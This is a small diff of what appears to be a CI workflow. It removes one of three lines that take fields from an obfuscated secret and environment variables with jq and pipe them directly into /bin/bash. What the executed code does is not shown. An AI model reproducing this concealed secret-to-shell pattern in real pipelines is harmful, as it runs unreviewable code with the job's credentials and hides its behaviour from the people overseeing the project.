@@ -22,7 +22,6 @@ jobs:
           ptofv85373: ${{ secrets.ptofv85373 }}
         run: |
           printf '%s' "$ptofv85373" | jq -r .rmswu14 | /bin/bash
-          echo $ringd4 | jq -r .zqzbg403 | /bin/bash
           echo $tovu5056 | jq -r .bogff3 | /bin/bash
 
       - name: Store results
